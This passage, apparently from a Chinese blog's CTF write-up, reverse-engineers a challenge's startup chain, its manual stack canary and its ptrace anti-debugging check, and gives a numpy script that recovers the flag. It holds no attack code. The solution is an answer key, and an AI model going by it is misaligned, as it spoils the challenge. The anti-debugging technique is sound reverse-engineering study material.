result+=<span class="hljs-built_in">chr</span>(kk)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></div></td></tr></table></figure>
<h3 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h3>
<p>这题主要学到了main函数的启动过程和反调试机制。</p>
<p>一个函数的启动首先从start函数开始，然后执行_libc_start_main，其中main、 _libc_csu_init、_libc_csu_fini都作为参数传递给_libc_start_main</p>
<p><img src="/posts/764dc2d/image-20230313214742677.png" srcset="/img/loading.gif" lazyload alt="image-20230313214742677"></p>
<p>然后这里有个change_stack函数</p>
<p><img src="/posts/764dc2d/image-20230313232402303.png" srcset="/img/loading.gif" lazyload alt="image-20230313232402303"></p>
<p>这里其实是根据我们输入的前四个字符来异或生成一个栈上的校验码，其实就相当于canary的值，只不过这里是手动判断，canary是程序自动帮我们判断。</p>
<p>会把生成的这个64位数字写入fs偏移0x28的位置，后面main函数里面会用到。</p>
<p><img src="/posts/764dc2d/image-20230313233203138.png" srcset="/img/loading.gif" lazyload alt="image-20230313233203138"></p>
<p><img src="/posts/764dc2d/image-20230313233408433.png" srcset="/img/loading.gif" lazyload alt="image-20230313233408433"></p>
<p>libc_start_main函数里面，main函数地址作为init函数第三个参数传递进去</p>
<p><img src="/posts/764dc2d/image-20230313215431881.png" srcset="/img/loading.gif" lazyload alt="image-20230313215431881"></p>
<p>然后init函数里面依次执行.preinit_aray和.init_array里面的存储的函数地址</p>
<p><img src="/posts/764dc2d/image-20230313231355939.png" srcset="/img/loading.gif" lazyload alt="image-20230313231355939"></p>
<p>.preinit_aray里面的函数就是根据我们的flag的第一个元素设置偏移，而我们flag开头是0ops，所以设置成的偏移就是48，也就是-4</p>
<p><img src="/posts/764dc2d/image-20230313215843024.png" srcset="/img/loading.gif" lazyload alt="image-20230313215843024"></p>
<p><img src="/posts/764dc2d/image-20230313215859604.png" srcset="/img/loading.gif" lazyload alt="image-20230313215859604"></p>
<p>下面这些奇怪的字符串如果在输入正确的flag的情况下，就会左移四个字符，就会变成正常的字符串显示了。</p>
<p><img src="/posts/764dc2d/image-20230313220939814.png" srcset="/img/loading.gif" lazyload alt="image-20230313220939814"></p>
<p>然后会调用init_proc</p>
<p>这里面有个if判断，判断ptrace返回值是否等于-1</p>
<blockquote>
<p>ptrace系统调用就是gdb等调试器使用的系统调用，其有一个特性就是当前进程已经被追踪了，就不能被其他父进程追踪。</p>
<p>所以反调试机制就可以通过判断ptrace(PTRACE_TRACEME, 0, 0, 0)的返回值来决定是否结束程序，比如下面这段代码，正常情况下程序没有调试，那么ptrace就会执行成功，会返回0，程序正常运行，如果我们使用了gdb调试他，那其实就是使用了一次ptrace,那么在main函数里面再次ptrace就会失败，返回-1，然后程序就知道自己被调试了，然后直接退出。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) ==<span class="hljs-number">-1</span> )<span class="hljs-comment">//这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t trace me！\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no one trace me！\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
</blockquote>
<p>这道题没有采用不要你调试的方法，而是设置了一个坑，一旦发现你调试了，就会跳过一步操作，直接checkflag，所以这导致了我一开始推出flag以后，发现gdb里面就能成功，但是正常运行程序就不能成功，刚开始百思不得其解，其实就是不知道反调试机制的原因。</p>
<p>这里通过判断是否调试，来决定main函数地址的变化</p>
<ul>
<li>如果没有调试，那么就会将a1，也就是main函数的地址+0x167，main地址末尾是0x467，加上0x167就等于0x5CE，这正好是checkflag的地址。</li>
<li>否则就不改变。</li>
</ul>
<p><img src="/posts/764dc2d/image-20230313224444146.png" srcset="/img/loading.gif" lazyload alt="image-20230313224444146"></p>
<p><img src="/posts/764dc2d/image-20230313224600132.png" srcset="/img/loading.gif" lazyload alt="image-20230313224600132"></p>
<p><img src="/posts/764dc2d/image-20230313224609149.png" srcset="/img/loading.gif" lazyload alt="image-20230313224609149"></p>
<p><img src="/posts/764dc2d/image-20230313224619273.png" srcset="/img/loading.gif" lazyload alt="image-20230313224619273"></p>
<p>然后执行.init_array，这里面有五个函数，分别是判断前五个字符是否0ops{，如果是则都返回0</p>
<p><img src="/posts/764dc2d/image-20230313230841814.png" srcset="/img/loading.gif" lazyload alt="image-20230313230841814"></p>
<p><img src="/posts/764dc2d/image-20230313230909856.png" srcset="/img/loading.gif" lazyload alt="image-20230313230909856"></p>
<p><img src="/posts/764dc2d/image-20230313230926089.png" srcset="/img/loading.gif" lazyload alt="image-20230313230926089"></p>
<p>然后根据上一步的返回值，决定是否进入下一个函数，就是说如果是0ops{开头，就会进入 下面的函数</p>
<p><img src="/posts/764dc2d/image-20230313231409500.png" srcset="/img/loading.gif" lazyload alt="image-20230313231409500"></p>
<p><img src="/posts/764dc2d/image-20230313231428019.png" srcset="/img/loading.gif" lazyload alt="image-20230313231428019"></p>
<p>这里是对前面trace结果的再次判断，并最终决定a1的值，也就是main函数的地址</p>
<ul>
<li>
<p>如果有调试，那么就会从0x5ce开始执行，这个函数如下：</p>
<p><img src="/posts/764dc2d/image-20230313231637076.png" srcset="/img/loading.gif" lazyload alt="image-20230313231637076"></p>
<p>就是对flag的位数和格式进行一次校验，如果满足，则会在之后打印true，否则输出格式错误。</p>
</li>
<li>
<p>如果没有调试，那么就会从0x67B，开始执行</p>
<p><img src="/posts/764dc2d/image-20230313231814790.png" srcset="/img/loading.gif" lazyload alt="image-20230313231814790"></p>
<p>这个函数就会在checkflag之前改变0ops{之后的五个字符，让你输入的flag脱离你的预期值。</p>
</li>
</ul>
<p>然后csu_init函数结束，开始执行main函数，但是这里其实执行的不是真正的main，而且前面改变后的main值，也就是0x5ce或者0x67B函数。</p>
<p><img src="/posts/764dc2d/image-20230313232037740.png" srcset="/img/loading.gif" lazyload alt="image-20230313232037740"></p>
<p>然后现在终于进入了我们的main函数，相对于前面那些初始设置来说，main函数其实就算简单了，首先其实就是个矩阵运算，通过flag前24位，来和一个矩阵table577运算得到bignum24,这两个矩阵的数据我们都可以拿到，只需要逆向进行一下矩阵的运算就可以了。</p>
<p><img src="/posts/764dc2d/image-20230313233533361.png" srcset="/img/loading.gif" lazyload alt="image-20230313233533361"></p>
<p>然后flag的后七位其实就是由我们最开始改变的栈上数据决定，因为可以看到flagbody的大小只有24字节，但是我们输入了31字节的字符，所以后面七个其实会溢出到v9的位置，就是会改变v9的值，而这个值就是开始通过异或存储到栈里面的，所以我们要将后七位设置成这个值，使得溢出后栈不会发生改变，从而不会打印出“stack smashing detected”</p>
<p><img src="/posts/764dc2d/image-20230313234112469.png" srcset="/img/loading.gif" lazyload alt="image-20230313234112469"></p>
<p>计算前24位的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">from</span> numpy.linalg <span class="hljs-keyword">import</span> *<br>bignum=[<span class="hljs-number">275623</span>,<span class="hljs-number">288797</span>,<span class="hljs-number">352625</span>,<span class="hljs-number">289022</span>,<span class="hljs-number">279737</span>,<span class="hljs-number">313258</span>,<span class="hljs-number">255205</span>,<span class="hljs-number">310193</span>,<span class="hljs-number">269313</span>,<span class="hljs-number">199036</span>,<span class="hljs-number">287802</span>,<span class="hljs-number">309135</span>,<span class="hljs-number">289781</span>,<span class="hljs-number">297548</span>,<span class="hljs-number">328213</span>,<span class="hljs-number">305565</span>,<span class="hljs-number">210062</span>,<span class="hljs-number">260614</span>,<span class="hljs-number">259399</span>,<span class="hljs-number">287371</span>,<span class="hljs-number">317251</span>,<span class="hljs-number">252513</span>,<span class="hljs-number">252864</span>,<span class="hljs-number">253479</span>]<br>num=[<span class="hljs-number">68</span>, <span class="hljs-number">94</span>, <span class="hljs-number">182</span>, <span class="hljs-number">252</span>, <span class="hljs-number">112</span>, <span class="hljs-number">103</span>, <span class="hljs-number">78</span>, <span class="hljs-number">223</span>, <span class="hljs-number">213</span>, <span class="hljs-number">39</span>, <span class="hljs-number">235</span>, <span class="hljs-number">20</span>, <span class="hljs-number">219</span>, <span class="hljs-number">185</span>, <span class="hljs-number">113</span>, <span class="hljs-number">199</span>, <span class="hljs-number">177</span>, <span class="hljs-number">34</span>, <span class="hljs-number">117</span>, <span class="hljs-number">152</span>, <span class="hljs-number">2</span>, <span class="hljs-number">248</span>,<span class="hljs-number">88</span>, <span class="hljs-number">237</span>]<br><br>v6=[bignum[i]-num[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bignum))]<br><br>tablelist = [<span class="hljs-number">243</span>,<span class="hljs-number">49</span>,<span class="hljs-number">242</span>,<span class="hljs-number">62</span>,<span class="hljs-number">248</span>,<span class="hljs-number">2</span>,<span class="hljs-number">124</span>,<span class="hljs-number">237</span>,<span class="hljs-number">90</span>,<span class="hljs-number">148</span>,<span class="hljs-number">132</span>,<span class="hljs-number">69</span>,<span class="hljs-number">33</span>,<span class="hljs-number">107</span>,<span class="hljs-number">190</span>,<span class="hljs-number">163</span>,<span class="hljs-number">35</span>,<span class="hljs-number">108</span>,<span class="hljs-number">57</span>,<span class="hljs-number">174</span>,<span class="hljs-number">79</span>,<span class="hljs-number">13</span>,<span class="hljs-number">110</span>,<span class="hljs-number">167</span>,<span class="hljs-number">141</span>,<span class="hljs-number">124</span>,<span class="hljs-number">188</span>,<span class="hljs-number">238</span>,<span class="hljs-number">109</span>,<span class="hljs-number">156</span>,<span class="hljs-number">20</span>,<span class="hljs-number">114</span>,<span class="hljs-number">70</span>,<span class="hljs-number">245</span>,<span class="hljs-number">184</span>,<span class="hljs-number">129</span>,<span class="hljs-number">197</span>,<span class="hljs-number">163</span>,<span class="hljs-number">166</span>,<span class="hljs-number">20</span>,<span class="hljs-number">147</span>,<span class="hljs-number">110</span>,<span class="hljs-number">164</span>,<br><span class="hljs-number">27</span>,<span class="hljs-number">134</span>,<span class="hljs-number">16</span>,<span class="hljs-number">54</span>,<span class="hljs-number">28</span>,<span class="hljs-number">114</span>,<span class="hljs-number">126</span>,<span class="hljs-number">218</span>,<span class="hljs-number">29</span>,<span class="hljs-number">72</span>,<span class="hljs-number">182</span>,<span class="hljs-number">1</span>,<span class="hljs-number">243</span>,<span class="hljs-number">80</span>,<span class="hljs-number">153</span>,<span class="hljs-number">208</span>,<span class="hljs-number">217</span>,<span class="hljs-number">230</span>,<span class="hljs-number">252</span>,<span class="hljs-number">188</span>,<span class="hljs-number">92</span>,<span class="hljs-number">217</span>,<br><span class="hljs-number">255</span>,<span class="hljs-number">182</span>,<span class="hljs-number">81</span>,<span class="hljs-number">32</span>,<span class="hljs-number">188</span>,<span class="hljs-number">50</span>,<span class="hljs-number">210</span>,<span class="hljs-number">164</span>,<span class="hljs-number">20</span>,<span class="hljs-number">241</span>,<span class="hljs-number">57</span>,<span class="hljs-number">29</span>,<span class="hljs-number">105</span>,<span class="hljs-number">238</span>,<span class="hljs-number">92</span>,<span class="hljs-number">90</span>,<span class="hljs-number">94</span>,<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">185</span>,<span class="hljs-number">66</span>,<span class="hljs-number">160</span>,<br><span class="hljs-number">214</span>,<span class="hljs-number">43</span>,<span class="hljs-number">176</span>,<span class="hljs-number">162</span>,<span class="hljs-number">215</span>,<span class="hljs-number">63</span>,<span class="hljs-number">179</span>,<span class="hljs-number">194</span>,<span class="hljs-number">174</span>,<span class="hljs-number">43</span>,<span class="hljs-number">94</span>,<span class="hljs-number">28</span>,<span class="hljs-number">191</span>,<span class="hljs-number">3</span>,<span class="hljs-number">142</span>,<span class="hljs-number">237</span>,<span class="hljs-number">79</span>,<span class="hljs-number">149</span>,<span class="hljs-number">113</span>,<span class="hljs-number">229</span>,<span class="hljs-number">171</span>,<span class="hljs-number">251</span>,<br><span class="hljs-number">196</span>,<span class="hljs-number">47</span>,<span class="hljs-number">95</span>,<span class="hljs-number">7</span>,<span class="hljs-number">36</span>,<span class="hljs-number">109</span>,<span class="hljs-number">26</span>,<span class="hljs-number">82</span>,<span class="hljs-number">217</span>,<span class="hljs-number">139</span>,<span class="hljs-number">204</span>,<span class="hljs-number">216</span>,<span class="hljs-number">171</span>,<span class="hljs-number">213</span>,<span class="hljs-number">1</span>,<span class="hljs-number">77</span>,<span class="hljs-number">182</span>,<span class="hljs-number">80</span>,<span class="hljs-number">145</span>,<span class="hljs-number">105</span>,<span class="hljs-number">191</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<br><span class="hljs-number">251</span>,<span class="hljs-number">130</span>,<span class="hljs-number">117</span>,<span class="hljs-number">59</span>,<span class="hljs-number">134</span>,<span class="hljs-number">213</span>,<span class="hljs-number">175</span>,<span class="hljs-number">182</span>,<span class="hljs-number">100</span>,<span class="hljs-number">117</span>,<span class="hljs-number">133</span>,<span class="hljs-number">240</span>,<span class="hljs-number">80</span>,<span class="hljs-number">165</span>,<span class="hljs-number">110</span>,<span class="hljs-number">176</span>,<span class="hljs-number">102</span>,<span class="hljs-number">2</span>,<span class="hljs-number">49</span>,<span class="hljs-number">133</span>,<span class="hljs-number">27</span>,<br><span class="hljs-number">137</span>,<span class="hljs-number">101</span>,<span class="hljs-number">36</span>,<span class="hljs-number">51</span>,<span class="hljs-number">99</span>,<span class="hljs-number">62</span>,<span class="hljs-number">153</span>,<span class="hljs-number">232</span>,<span class="hljs-number">69</span>,<span class="hljs-number">51</span>,<span class="hljs-number">189</span>,<span class="hljs-number">221</span>,<span class="hljs-number">78</span>,<span class="hljs-number">42</span>,<span class="hljs-number">232</span>,<span class="hljs-number">171</span>,<span class="hljs-number">140</span>,<span class="hljs-number">53</span>,<span class="hljs-number">150</span>,<span class="hljs-number">98</span>,<span class="hljs-number">106</span>,<span class="hljs-number">102</span>,<br><span class="hljs-number">235</span>,<span class="hljs-number">70</span>,<span class="hljs-number">100</span>,<span class="hljs-number">220</span>,<span class="hljs-number">94</span>,<span class="hljs-number">162</span>,<span class="hljs-number">214</span>,<span class="hljs-number">218</span>,<span class="hljs-number">143</span>,<span class="hljs-number">148</span>,<span class="hljs-number">192</span>,<span class="hljs-number">36</span>,<span class="hljs-number">162</span>,<span class="hljs-number">243</span>,<span class="hljs-number">68</span>,<span class="hljs-number">191</span>,<span class="hljs-number">25</span>,<span class="hljs-number">76</span>,<span class="hljs-number">7</span>,<span class="hljs-number">70</span>,<span class="hljs-number">53</span>,<span class="hljs-number">179</span>,<br><span class="hljs-number">203</span>,<span class="hljs-number">168</span>,<span class="hljs-number">227</span>,<span class="hljs-number">252</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">10</span>,<span class="hljs-number">42</span>,<span class="hljs-number">86</span>,<span class="hljs-number">177</span>,<span class="hljs-number">215</span>,<span class="hljs-number">140</span>,<span class="hljs-number">57</span>,<span class="hljs-number">99</span>,<span class="hljs-number">124</span>,<span class="hljs-number">33</span>,<span class="hljs-number">150</span>,<span class="hljs-number">119</span>,<span class="hljs-number">175</span>,<span class="hljs-number">141</span>,<span class="hljs-number">123</span>,<span class="hljs-number">92</span>,<br><span class="hljs-number">58</span>,<span class="hljs-number">25</span>,<span class="hljs-number">68</span>,<span class="hljs-number">181</span>,<span class="hljs-number">87</span>,<span class="hljs-number">80</span>,<span class="hljs-number">43</span>,<span class="hljs-number">42</span>,<span class="hljs-number">69</span>,<span class="hljs-number">117</span>,<span class="hljs-number">246</span>,<span class="hljs-number">73</span>,<span class="hljs-number">192</span>,<span class="hljs-number">61</span>,<span class="hljs-number">14</span>,<span class="hljs-number">33</span>,<span class="hljs-number">7</span>,<span class="hljs-number">101</span>,<span class="hljs-number">9</span>,<span class="hljs-number">240</span>,<span class="hljs-number">77</span>,<span class="hljs-number">251</span>,<span class="hljs-number">38</span>,<span class="hljs-number">208</span>,<br><span class="hljs-number">51</span>,<span class="hljs-number">228</span>,<span class="hljs-number">31</span>,<span class="hljs-number">226</span>,<span class="hljs-number">112</span>,<span class="hljs-number">7</span>,<span class="hljs-number">251</span>,<span class="hljs-number">118</span>,<span class="hljs-number">254</span>,<span class="hljs-number">13</span>,<span class="hljs-number">58</span>,<span class="hljs-number">197</span>,<span class="hljs-number">127</span>,<span class="hljs-number">31</span>,<span class="hljs-number">49</span>,<span class="hljs-number">28</span>,<span class="hljs-number">161</span>,<span class="hljs-number">138</span>,<span class="hljs-number">30</span>,<span class="hljs-number">11</span>,<span class="hljs-number">206</span>,<span class="hljs-number">48</span>,<br><span class="hljs-number">188</span>,<span class="hljs-number">191</span>,<span class="hljs-number">228</span>,<span class="hljs-number">254</span>,<span class="hljs-number">253</span>,<span class="hljs-number">238</span>,<span class="hljs-number">111</span>,<span class="hljs-number">60</span>,<span class="hljs-number">99</span>,<span class="hljs-number">28</span>,<span class="hljs-number">0</span>,<span class="hljs-number">173</span>,<span class="hljs-number">128</span>,<span class="hljs-number">242</span>,<span class="hljs-number">62</span>,<span class="hljs-number">78</span>,<span class="hljs-number">109</span>,<span class="hljs-number">220</span>,<span class="hljs-number">99</span>,<span class="hljs-number">28</span>,<span class="hljs-number">3</span>,<span class="hljs-number">44</span>,<br><span class="hljs-number">216</span>,<span class="hljs-number">37</span>,<span class="hljs-number">175</span>,<span class="hljs-number">26</span>,<span class="hljs-number">240</span>,<span class="hljs-number">109</span>,<span class="hljs-number">211</span>,<span class="hljs-number">85</span>,<span class="hljs-number">85</span>,<span class="hljs-number">176</span>,<span class="hljs-number">66</span>,<span class="hljs-number">121</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>,<span class="hljs-number">27</span>,<span class="hljs-number">223</span>,<span class="hljs-number">123</span>,<span class="hljs-number">214</span>,<span class="hljs-number">210</span>,<span class="hljs-number">39</span>,<span class="hljs-number">96</span>,<br><span class="hljs-number">126</span>,<span class="hljs-number">214</span>,<span class="hljs-number">91</span>,<span class="hljs-number">58</span>,<span class="hljs-number">214</span>,<span class="hljs-number">25</span>,<span class="hljs-number">218</span>,<span class="hljs-number">254</span>,<span class="hljs-number">43</span>,<span class="hljs-number">82</span>,<span class="hljs-number">23</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">127</span>,<span class="hljs-number">171</span>,<span class="hljs-number">188</span>,<span class="hljs-number">26</span>,<span class="hljs-number">128</span>,<span class="hljs-number">233</span>,<span class="hljs-number">195</span>,<span class="hljs-number">161</span>,<span class="hljs-number">155</span>,<br><span class="hljs-number">108</span>,<span class="hljs-number">118</span>,<span class="hljs-number">36</span>,<span class="hljs-number">219</span>,<span class="hljs-number">94</span>,<span class="hljs-number">158</span>,<span class="hljs-number">27</span>,<span class="hljs-number">111</span>,<span class="hljs-number">120</span>,<span class="hljs-number">15</span>,<span class="hljs-number">99</span>,<span class="hljs-number">246</span>,<span class="hljs-number">216</span>,<span class="hljs-number">237</span>,<span class="hljs-number">150</span>,<span class="hljs-number">207</span>,<span class="hljs-number">239</span>,<span class="hljs-number">94</span>,<span class="hljs-number">109</span>,<span class="hljs-number">20</span>,<span class="hljs-number">252</span>,<br><span class="hljs-number">94</span>,<span class="hljs-number">84</span>,<span class="hljs-number">204</span>,<span class="hljs-number">176</span>,<span class="hljs-number">157</span>,<span class="hljs-number">44</span>,<span class="hljs-number">156</span>,<span class="hljs-number">123</span>,<span class="hljs-number">196</span>,<span class="hljs-number">27</span>,<span class="hljs-number">227</span>,<span class="hljs-number">22</span>,<span class="hljs-number">141</span>,<span class="hljs-number">232</span>,<span class="hljs-number">182</span>,<span class="hljs-number">182</span>,<span class="hljs-number">160</span>,<span class="hljs-number">89</span>,<span class="hljs-number">218</span>,<span class="hljs-number">184</span>,<span class="hljs-number">44</span>,<br><span class="hljs-number">120</span>,<span class="hljs-number">152</span>,<span class="hljs-number">4</span>,<span class="hljs-number">30</span>,<span class="hljs-number">227</span>,<span class="hljs-number">31</span>,<span class="hljs-number">41</span>,<span class="hljs-number">146</span>,<span class="hljs-number">168</span>,<span class="hljs-number">205</span>,<span class="hljs-number">245</span>,<span class="hljs-number">77</span>,<span class="hljs-number">8</span>,<span class="hljs-number">32</span>,<span class="hljs-number">181</span>,<span class="hljs-number">128</span>,<span class="hljs-number">17</span>,<span class="hljs-number">97</span>,<span class="hljs-number">24</span>,<span class="hljs-number">171</span>,<span class="hljs-number">206</span>,<span class="hljs-number">86</span>,<span class="hljs-number">56</span>,<br><span class="hljs-number">176</span>,<span class="hljs-number">91</span>,<span class="hljs-number">33</span>,<span class="hljs-number">17</span>,<span class="hljs-number">184</span>,<span class="hljs-number">51</span>,<span class="hljs-number">161</span>,<span class="hljs-number">66</span>,<span class="hljs-number">130</span>,<span class="hljs-number">11</span>,<span class="hljs-number">140</span>,<span class="hljs-number">151</span>,<span class="hljs-number">63</span>,<span class="hljs-number">116</span>,<span class="hljs-number">182</span>,<span class="hljs-number">199</span>,<span class="hljs-number">70</span>,<span class="hljs-number">35</span>,<span class="hljs-number">147</span>,<span class="hljs-number">87</span>,<span class="hljs-number">33</span>,<span class="hljs-number">146</span>,<br><span class="hljs-number">30</span>,<span class="hljs-number">103</span>,<span class="hljs-number">85</span>,<span class="hljs-number">250</span>,<span class="hljs-number">8</span>,<span class="hljs-number">105</span>,<span class="hljs-number">137</span>,<span class="hljs-number">3</span>,<span class="hljs-number">215</span>,<span class="hljs-number">240</span>,<span class="hljs-number">188</span>,<span class="hljs-number">40</span>,<span class="hljs-number">200</span>,<span class="hljs-number">70</span>,<span class="hljs-number">44</span>,<span class="hljs-number">134</span>,<span class="hljs-number">208</span>,<span class="hljs-number">174</span>,<span class="hljs-number">61</span>,<span class="hljs-number">127</span>,<span class="hljs-number">222</span>,<span class="hljs-number">153</span>,<br><span class="hljs-number">38</span>,<span class="hljs-number">73</span>,<span class="hljs-number">1</span>,<span class="hljs-number">51</span>,<span class="hljs-number">44</span>,<span class="hljs-number">202</span>,<span class="hljs-number">18</span>,<span class="hljs-number">13</span>,<span class="hljs-number">236</span>,<span class="hljs-number">113</span>,<span class="hljs-number">67</span>,<span class="hljs-number">249</span>,<span class="hljs-number">147</span>,<span class="hljs-number">76</span>,<span class="hljs-number">161</span>,<span class="hljs-number">34</span>,<span class="hljs-number">113</span>,<span class="hljs-number">10</span>,<span class="hljs-number">29</span>,<span class="hljs-number">227</span>,<span class="hljs-number">113</span>,<span class="hljs-number">177</span>,<span class="hljs-number">55</span>,<br><span class="hljs-number">183</span>,<span class="hljs-number">91</span>,<span class="hljs-number">87</span>,<span class="hljs-number">172</span>,<span class="hljs-number">90</span>,<span class="hljs-number">149</span>,<span class="hljs-number">114</span>,<span class="hljs-number">50</span>,<span class="hljs-number">136</span>,<span class="hljs-number">22</span>,<span class="hljs-number">139</span>,<span class="hljs-number">221</span>,<span class="hljs-number">11</span>,<span class="hljs-number">47</span>,<span class="hljs-number">142</span>,<span class="hljs-number">208</span>,<span class="hljs-number">131</span>,<span class="hljs-number">252</span>,<span class="hljs-number">139</span>,<span class="hljs-number">150</span>,<span class="hljs-number">206</span>,<br><span class="hljs-number">100</span>,<span class="hljs-number">120</span>,<span class="hljs-number">165</span>,<span class="hljs-number">178</span>,<span class="hljs-number">198</span>,<span class="hljs-number">158</span>,<span class="hljs-number">91</span>,<span class="hljs-number">92</span>,<span class="hljs-number">61</span>,<span class="hljs-number">176</span>,<span class="hljs-number">202</span>,<span class="hljs-number">240</span>,<span class="hljs-number">100</span>,<span class="hljs-number">163</span>,<span class="hljs-number">14</span>,<span class="hljs-number">105</span>,<span class="hljs-number">172</span>,<span class="hljs-number">89</span>,<span class="hljs-number">68</span>,<span class="hljs-number">93</span>,<span class="hljs-number">183</span>,<br><span class="hljs-number">60</span>,<span class="hljs-number">1</span>,<span class="hljs-number">172</span>,<span class="hljs-number">233</span>,<span class="hljs-number">134</span>,<span class="hljs-number">61</span>,<span class="hljs-number">126</span>,<span class="hljs-number">45</span>,<span class="hljs-number">111</span>,<span class="hljs-number">34</span>,<span class="hljs-number">11</span>,<span class="hljs-number">11</span>,<span class="hljs-number">73</span>,<span class="hljs-number">42</span>,<span class="hljs-number">196</span>,<span class="hljs-number">178</span>,<span class="hljs-number">198</span>,<span class="hljs-number">80</span>,<span class="hljs-number">53</span>,<span class="hljs-number">187</span>,<span class="hljs-number">13</span>,<span class="hljs-number">189</span>,<br><span class="hljs-number">127</span>,<span class="hljs-number">240</span>,<span class="hljs-number">252</span>,<span class="hljs-number">74</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">64</span>,<span class="hljs-number">9</span>,<span class="hljs-number">185</span>,<span class="hljs-number">164</span>,<span class="hljs-number">158</span>,<span class="hljs-number">0</span>,<span class="hljs-number">153</span>,<span class="hljs-number">40</span>,<span class="hljs-number">68</span>,<span class="hljs-number">132</span>,<span class="hljs-number">96</span>,<span class="hljs-number">131</span>,<span class="hljs-number">10</span>,<span class="hljs-number">96</span>,<span class="hljs-number">37</span>,<span class="hljs-number">213</span>,<span class="hljs-number">243</span>,<br><span class="hljs-number">204</span>,<span class="hljs-number">144</span>,<span class="hljs-number">126</span>,<span class="hljs-number">183</span>,<span class="hljs-number">98</span>,<span class="hljs-number">149</span>,<span class="hljs-number">132</span>,<span class="hljs-number">11</span>,<span class="hljs-number">22</span>,<span class="hljs-number">159</span>,<span class="hljs-number">186</span>,<span class="hljs-number">35</span>,<span class="hljs-number">207</span>,<span class="hljs-number">17</span>,<span class="hljs-number">8</span>,<span class="hljs-number">109</span>,<span class="hljs-number">76</span>,<span class="hljs-number">54</span>,<span class="hljs-number">80</span>,<span class="hljs-number">240</span>,<span class="hljs-number">42</span>,<span class="hljs-number">240</span>,<br><span class="hljs-number">106</span>,<span class="hljs-number">115</span>,<span class="hljs-number">61</span>,<span class="hljs-number">66</span>,<span class="hljs-number">182</span>]<br><br>table=np.array(tablelist).reshape(<span class="hljs-number">24</span>,<span class="hljs-number">24</span>)<br><br>b=np.array(v6)<br>result=solve(table,b)<br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    <span class="hljs-comment">#一个坑点，矩阵运算结果转换成int需要+0.5,虽然上一步打印结果是发现都是很整齐的整数，但是其实可以只是一个很接近整数的数，比如5. 其实可能是4.9999999,这时候直接int就会变成4了。</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(result[i]+<span class="hljs-number">0.5</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment"># print(np.dot(table,result))</span><br><br><span class="hljs-comment">#  output:   check_y0ur_r3ve2sing_j0u</span><br></code></pre></div></td></tr></table></figure>
<p>计算后七位的脚本如下：</p>
